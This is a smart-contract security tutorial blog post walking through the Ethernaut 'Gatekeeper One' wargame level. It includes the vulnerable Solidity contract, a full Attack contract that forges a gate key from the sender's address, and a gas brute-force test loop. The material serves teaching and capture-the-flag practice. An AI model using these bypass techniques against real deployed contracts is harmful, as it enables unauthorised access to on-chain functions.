



Ethernaut Challenge 13: Gatekeeper One - Metana






















































































 












Skip links* [Skip to primary navigation](#primary-nav)
* [Skip to content](#lqd-site-content)



 





 


 




Call us +1 415 416 0800 


















 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 








* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Bootcamps](#) 








###### Web3

 






### Web3 Solidity Bootcamp



Most Popular 🔥
The most advanced Solidity curriculum on the internet











### Full Stack Web3 Beginner Bootcamp



New ✨ | Beginner 👨‍💻
Starting off with web development and seamlessly integrating web3 development











### Web3 Rust Bootcamp



Become an expert Solana blockchain developer with one course!














###### Coding + Career Growth

 




 








### Software Engineering Bootcamp



Become a Software Engineer - Balance everyday life commitments & launch your coding career in as little as 16 weeks











### Metana's JobCamp™️



Learn to make a lasting first impressions, network effectively & search for jobs with confidence.















 ![](https://metana.io/wp-content/uploads/2023/10/Screenshot-2023-10-25-at-7.51.33 PM-300x61.png) 




 Rated
the Best

 





 Ranked as the industry's premier Web3 bootcamp with a stellar 4.8/5 star rating on Course Report.

 




[Read more reviews here](/reviews/)












[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)
* [Resources](#)
	+ [Reviews](https://metana.io/reviews/)
	+ [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
	+ [Tuition](https://metana.io/tuition/)
	+ [Events](https://metana.io/events/)
* [Blog](https://metana.io/blog/)

 





[Apply now](https://metana.typeform.com/general)






















 







 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 









Metana Bootcamps
----------------

 






* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Full Stack Web3 Bootcamp](https://metana.io/web3-beginner-bootcamp/)
* [Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [Cybersecurity Bootcamp](https://metana.io/cybersecurity-bootcamp/)
* [AI & Machine Learning Bootcamp](https://metana.io/ai-machine-learning-bootcamp/)
* [Data Analytics Bootcamp](https://metana.io/data-analytics-bootcamp/)
* [Data Science Bootcamp](https://metana.io/data-science-bootcamp/)
* [Full Stack Bootcamp](https://metana.io/full-stack-software-engineer-bootcamp/)
* [Jobcamp](https://metana.io/jobcamp/)

 














Menu Items
----------

 






* [Blog](https://metana.io/blog/)
* [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
* [Refer a Friend](https://metana.io/refer/)
* [Tuition](https://metana.io/tuition/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)

 









 








 [[email protected]](/cdn-cgi/l/email-protection)

 




 

[Facebook](https://www.facebook.com/metanahq) 


[Twitter](https://twitter.com/metanahq) 


[Linkedin](https://www.linkedin.com/school/metana/) 


























 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 




[Apply now](https://metana.typeform.com/general)
























 
#### Table of Contents





 







Ethernaut Challenge 13 Walkthrough: Gatekeeper One
==================================================

 



 * [Georgi Plamenov](https://metana.io/blog/author/georgi-plamenov/)
* [June 19, 2024](https://metana.io/blog/2024/06/19/)
* [Ethernaut Walkthrough](https://metana.io/blog/category/ethernaut-walkthrough/)














Challenge 13: **Gatekeeper One, also known as Ethernaut Level 13**, stands out because it necessitates a thorough understanding of Ethereum transactions and gas mechanics. This article will delve into the GatekeeperOne contract, identify its vulnerabilities, and explain how the Attack contract effectively exploits these weaknesses. **Participants need to demonstrate advanced knowledge of smart contract security to overcome this challenge.**


Ethernaut Challenge 13: A Case Study
------------------------------------


To illustrate the complexities of [Ethereum transactions](https://metana.io/blog/how-to-send-ethereum-transactions-using-web3-js/) and gas mechanics, let’s examine a solution to **Ethernaut Challenge 13**. In this challenge, participants are tasked with bypassing multiple checks to interact with a contract.


The Gatekeeper One Contract
---------------------------



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### Modifier Analysis


1. **gateOne()**: This modifier ensures that the caller of the function is a contract and not a regular externally owned account (EOA). It checks that `msg.sender` is not equal to `tx.origin`.



```
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

2. **gateTwo()**: This modifier checks that the remaining gas is a multiple of 8191. This check is particularly tricky because it requires precise gas management.



```
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```

3. **gateThree()**: This modifier imposes three constraints on a 64-bit key (`_gateKey`):


* The lower 32 bits of the key must equal the lower 16 bits of the key.
* The key must not be equal to the lower 32 bits of the key.
* The lower 16 bits of the key must equal the lower 16 bits of the caller’s (`tx.origin`) address.



```
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}
```

The Attack Contract
-------------------


To successfully call the `enter` function in GatekeeperOne, an attacker must satisfy all three gate conditions. Let’s look at the Attack contract designed to bypass these gates:



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    GatekeeperOne target;

    constructor(GatekeeperOne _target) {
        target = _target;
    }

    function hack(uint256 gas) external {
        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;

        (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));
        require(sent, "Transaction failed");
    }
}
```

### Attack Strategy


1. **gateOne**: To bypass this gate, the attack must come from a contract, which is inherent to our Attack contract.
2. **gateTwo**: The `gasleft() % 8191 == 0` check requires careful manipulation of the gas. This is managed by passing a specific gas amount to the `hack` function.
3. **gateThree**: As mentioned in the Modifier Analysis, the attack contract constructs a key that satisfies all three parts of gateThree:


* **uint32(uint64(\_gateKey)) == uint16(uint64(\_gateKey))**: Ensures the lower 32 bits of the key equal the lower 16 bits.
* **uint32(uint64(\_gateKey)) == uint16(uint160(tx.origin))**: Ensures the lower 16 bits of the key match the lower 16 bits of the caller’s address.
* **uint32(uint64(\_gateKey)) != uint64(\_gateKey)**: This ensures the key isn’t simply the lower 32 bits. The lower 8 bytes (64 bits) of the key must be different from the lower 4 bytes (32 bits). This means that while satisfying the first requirement, the entire lower 8 bytes must not be the same as the lower 4 bytes.


To achieve this, we need to ensure that the upper 4 bytes of the 8-byte key differ from the lower 4 bytes. However, we still need to meet the first requirement. Therefore, we need to modify our mask to allow the upper 4 bytes to pass through unchanged. The new mask becomes 0xFFFFFFFF0000FFFF, which zeroes out only the higher 2 bytes of the lower 4 bytes while preserving the upper 4 bytes.



![ethernaut challenge 13, gatekeeper one](https://metana.io/wp-content/uploads/2024/06/BigLevel13.svg)
### Constructing the Key


To create a key that satisfies these conditions, the following steps are taken:


* Convert the caller’s address to a `uint160`.
* Then convert it to a `uint64`, retaining only the lower 8 bytes.
* Apply the mask `0xFFFFFFFF0000FFFF` to zero out the higher 2 bytes of the lower 4 bytes while preserving the upper 4 bytes.



```
bytes8 key = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;
```

This ensures that:


1. The lower 2 bytes of the key are equal to the lower 4 bytes of the key.
2. The key’s lower 8 bytes are not simply a repetition of the lower 4 bytes.
3. The key’s lower 2 bytes match the lower 2 bytes of the caller’s address.


### Execution


To execute the attack, the attacker needs to carefully choose the gas amount and call the `hack` function:



```
function hack(uint256 gas) external {
    uint64 uintKey = uint64(uint160(address(msg.sender)));
    bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;

    (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));
    require(sent, "Transaction failed");
}
```

### Gas Calculation


The exact gas amount required to satisfy `gateTwo` can be determined through trial and error or by inspecting the gas cost of the operations up to the `gasleft() % 8191` check. Typically, the process involves making multiple attempts with slightly different gas values until the condition is met. The gas costs can vary depending on the Solidity compiler version used to compile the code. However, we can find the required gas by writing a test using a forked local test environment that includes:



```
for (uint256 i = 200; i <= 8191; i++) {
    try attack.hack(i) {
        console.log("gas required ->", i);
        break;
    } catch {}
}
```

Conclusion
----------


The GatekeeperOne challenge highlights the complexities of Ethereum’s gas mechanics and the critical role of understanding how modifiers and low-level function calls interact. By meticulously designing the Attack contract, an attacker can circumvent all the gates and successfully invoke the enter function, demonstrating the advanced problem-solving skills and strategic thinking necessary for [smart contract security](https://metana.io/blog/smart-contract-auditing-essential-guide-for-blockchain-security/). This challenge emphasizes the importance of comprehensive testing and careful consideration of edge cases when developing smart contracts, ensuring that all potential vulnerabilities are addressed.



![faq](https://metana.io/wp-content/uploads/2024/05/Questions-bro-1.svg)
FAQs
----


**How does the use of modifiers enhance contract security?**


* Modifiers enhance contract security by allowing developers to encapsulate common checks and conditions that must be met before executing a function. This modular approach helps ensure that certain constraints are consistently enforced, reducing the risk of vulnerabilities.


**How does the choice of Solidity compiler version affect gas costs?**


* Gas costs can vary depending on the Solidity compiler version used and the specific compiler flags applied during the compilation process. Different versions and flags can optimize code differently, affecting the overall gas consumption of transactions.


**How does this challenge help in understanding Ethereum security?**


* This challenge helps in understanding Ethereum security by illustrating how different security mechanisms like modifiers can be combined to protect contract functions. It also highlights the importance of gas management and the potential for bypassing security checks through careful planning and execution.


**What happens if the `require` statement in `hack` fails?**


* If the require statement in hack fails, the transaction reverts with the error message “Transaction failed.” This prevents the attack from silently failing and provides immediate feedback that the attempt was unsuccessful.


**Why is thorough testing important when designing smart contracts?**


* Thorough testing is crucial because it helps identify and mitigate potential vulnerabilities, ensuring that all edge cases and attack vectors are considered and addressed. This reduces the risk of exploits and enhances the overall security of the contract.


  







![](https://metana.io/wp-content/uploads/2024/06/Ethernaut-Challenge-13-Walkthrough-Gatekeeper-One.jpg) 





[PrevPreviousExploring the Mempool: A Deep Dive](https://metana.io/blog/exploring-the-mempool-a-deep-dive/) 




[NextAccess Control in Solidity Smart ContractsNext](https://metana.io/blog/access-control-in-solidity-smart-contracts/) 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy ✨

 




 You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






Web3 Solidity Bootcamp
======================

 





 The most advanced Solidity curriculum on the internet!

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-beginner-bootcamp/)













You may also like
-----------------

 






![](https://metana.io/wp-content/uploads/2024/07/Protect-Yourself-from-Rug-Pulls-Tips-to-Avoid-Crypto-Scams-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




9 mins ago

#### [Protect Yourself from Rug Pulls: Tips to Avoid Crypto Scams](https://metana.io/blog/protect-yourself-from-rug-pulls-tips-to-avoid-crypto-scams/)




The world of Web3 is brimming with promises of high returns and revolutionary projects, driving 


![](https://metana.io/wp-content/uploads/2024/07/ERC-Token-Standards-Your-Simplified-Guide-copy-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




1 day ago

#### [Address Poisoning in Smart Contracts](https://metana.io/blog/address-poisoning-in-smart-contracts/)




Web3 thrives on user empowerment and the ease of sending and receiving cryptocurrency. However, a 
 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy

 




You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






#### Web3 Solidity Bootcamp

 





 The most advanced Solidity curriculum on the internet

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services







 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




[View Program](/web3-beginner-bootcamp/)







Events by Metana
================

 





 Dive into the exciting world of Web3 with us as we explore cutting-edge technical topics, provide valuable insights into the job market landscape, and offer guidance on securing lucrative positions in Web3. 

 




 





 







Do you have anything you want us to cover in our blog posts? What should we talk about next? We need your suggestions! 
 





Submit
















Start Your  Application
-----------------------

 






Secure your spot now. Spots are limited, and we accept qualified applicants on a first come, first served basis..




 






Email(Required)

Career Track(Required)


Web3



Data



Full Stack



Cyber

  








Δ










The application is free and takes just 3 minutes to complete.

 















##### What is included in the course?

 






### Expert-curated curriculum










### Weekly 1:1 video calls with your mentor










### Weekly group mentoring calls










### On-demand mentor support










### Portfolio reviews by Design hiring managers










### Resume & LinkedIn profile reviews










### Active online student community










### 1:1 and group career coaching calls










### Access to our employer network










### Job Guarantee




















 






###### Address

 





 44 Montgomery St,   

San Francisco, CA 94104, United States

 












Email 







Subscribe












###### Contact us

 





###### Call us directly

 





 (415) 416-0800

 





###### Mail us directly

 





 [[email protected]](/cdn-cgi/l/email-protection)

 









### Company

 




* [Home](/)
* [Blog](https://metana.io/blog/)
* [Jobs at Metana](/jobs/)
* [Bootcamp Application](https://metana.io/apply/)
* [Refer a friend](/refer/)
* [Student Perks](/perks/)
* [Testimonials](/reviews)
* [LMS login](https://app.metana.io/)
* [Open LMS login (Full Stack)](https://open.metana.io/)









### Bootcamp

 




* [Web3 Bootcamps](https://metana.io/web3-0-bootcamp/)
* [- Solidity Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Web3 Beginner Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [- ZK Bootcamp](/web3-zero-knowledge-bootcamp/)
* [Data + AI bootcamps](#)
* [- Data Analytics Bootcamp](/data-analytics-bootcamp/)
* [- Data Science Bootcamp](/data-science-bootcamp/)
* [- AI/ML Bootcamp](/ai-machine-learning-bootcamp/)
* [Software Engineering Bootcamp](/full-stack-software-engineer-bootcamp/)
* [Cybersecurity Bootcamp](/cybersecurity-bootcamp/)
* [Jobcamp](/jobcamp/)
* [Tuition](https://metana.io/tuition/)









### For businesses

 




* [Business](https://metana.io/business/)
* [- Hiring Partner](https://metana.io/business/hiring-partner/)
* [- Upskill Your Team](/business/upskill-your-team/)









### Legal

 




* [Licences](https://metana.io/licences/)
* [Metana's Job Guarantee](https://metana.io/job-guarantee/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)
* [Privacy Policy](/privacy-policy/)













[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)








[![](https://metana.io/wp-content/uploads/2022/07/Metana-Logo-Black-Full.png)](https://metana.io) 







 Disclaimer:
‍
Metana is involved in the Blockchain Education activities only. We are not dealing with any Crypto related stuff nor provide advice in the Crypto related field.

 

















 Metana is a pioneer in education and career transformation, specializing in today’s most in-demand skills. The leading source for training, staffing, and career transitions, we foster a flourishing community of professionals pursuing careers they love.
| © 2023 Edmore (private) limited

 








[Facebook](https://www.facebook.com/metanahq) 





[Linkedin](https://www.linkedin.com/school/metana/) 














































































Adding {{itemName}} to cart


Added {{itemName}} to cart













Loading...



×






